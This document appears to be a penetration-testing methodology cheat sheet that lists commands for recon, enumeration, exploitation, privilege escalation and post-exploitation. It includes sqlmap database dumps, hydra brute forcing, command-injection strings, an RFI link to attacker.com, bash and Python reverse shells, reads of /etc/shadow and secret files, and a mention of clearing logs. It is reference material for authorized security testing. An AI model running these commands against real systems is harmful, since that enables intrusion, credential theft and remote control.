# FLLC Penetration Testing Methodology

> Systematic approach to authorized security assessments.

---

## Phase 1: Reconnaissance

### Passive Recon
```bash
# WHOIS
whois target.com

# DNS records
dig target.com ANY +noall +answer
dig target.com MX
dig target.com NS
dig target.com TXT

# Subdomain enumeration
subfinder -d target.com -silent | httpx -silent
amass enum -passive -d target.com

# Google dorking
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"
site:target.com ext:sql | ext:env | ext:log

# Wayback Machine
waybackurls target.com | sort -u

# Certificate transparency
curl "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u

# Shodan
shodan search hostname:target.com
shodan host 1.2.3.4
```

### Active Recon
```bash
# Port scan (full TCP + top UDP)
nmap -sC -sV -O -p- -oA full_tcp target.com
nmap -sU --top-ports 100 -oA top_udp target.com

# Web technology fingerprint
whatweb target.com
wappalyzer https://target.com

# Directory enumeration
gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 50
feroxbuster -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Virtual host enumeration
gobuster vhost -u https://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

## Phase 2: Enumeration

### Web
```bash
# Nikto
nikto -h https://target.com

# Parameter discovery
arjun -u https://target.com/api/endpoint

# API enumeration
ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# JavaScript analysis
katana -u https://target.com -jc -d 3 | sort -u
```

### SMB (445)
```bash
smbclient -N -L //target.com
smbmap -H target.com
enum4linux -a target.com
crackmapexec smb target.com --shares
```

### LDAP (389/636)
```bash
ldapsearch -x -H ldap://target.com -b "dc=target,dc=com"
ldapdomaindump target.com -u 'DOMAIN\user' -p 'pass'
```

### SNMP (161)
```bash
snmpwalk -c public -v2c target.com
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt target.com
```

## Phase 3: Exploitation

### Web Application
```bash
# SQL injection
sqlmap -u "https://target.com/page?id=1" --batch --dbs
sqlmap -u "https://target.com/page?id=1" --batch -D dbname --tables
sqlmap -u "https://target.com/page?id=1" --batch -D dbname -T users --dump

# XSS
dalfox url "https://target.com/search?q=test" --blind https://your.xss.ht

# File inclusion
# LFI: ../../../etc/passwd
# RFI: http://attacker.com/shell.php

# Command injection
; whoami
| id
$(id)
`id`

# SSRF
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
```

### Password Attacks
```bash
# Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com

# Hash cracking
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt    # MD5
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt  # NTLM
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Shells
```bash
# Reverse shell (bash)
bash -i >& /dev/tcp/LHOST/LPORT 0>&1

# Reverse shell (Python)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Upgrade shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## Phase 4: Privilege Escalation

### Linux
```bash
# Enumeration
sudo -l
find / -perm -4000 2>/dev/null         # SUID binaries
find / -writable -type f 2>/dev/null     # Writable files
cat /etc/crontab
ls -la /etc/cron*
getcap -r / 2>/dev/null                  # Capabilities

# Automated
./linpeas.sh
./linux-exploit-suggester.sh

# Common vectors
# SUID: Check GTFOBins
# Cron: Writable script in cron
# Capabilities: python3 with cap_setuid
# Kernel: Check version against known CVEs
```

### Windows
```powershell
# Enumeration
whoami /all
net user
net localgroup administrators
systeminfo
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated

# Automated
.\winPEAS.exe
.\Seatbelt.exe -group=all

# Common vectors
# AlwaysInstallElevated → msfvenom msi payload
# Unquoted service paths → sc qc "ServiceName"
# Token impersonation → PrintSpoofer, JuicyPotato
# DLL hijacking → Check missing DLLs in procmon
```

## Phase 5: Post-Exploitation

```bash
# Data collection
cat /etc/shadow
cat /etc/passwd
find / -name "*.conf" -o -name "*.config" -o -name "*.env" 2>/dev/null

# Persistence
# Cron job, SSH key, user creation, SUID binary

# Lateral movement
# SSH with found credentials
# Pass-the-hash: crackmapexec smb target -u user -H hash
# PSExec: impacket-psexec domain/user:pass@target

# Cleanup
# Remove uploaded tools
# Clear logs (if authorized)
# Document everything
```

## Phase 6: Reporting

```
1. Executive Summary
2. Scope and Methodology
3. Findings (Critical → Low)
   - Description
   - Impact
   - Steps to Reproduce
   - Evidence (screenshots, logs)
   - Remediation
4. Appendices
```

---

*FLLC 2026 — Authorized penetration testing only.*
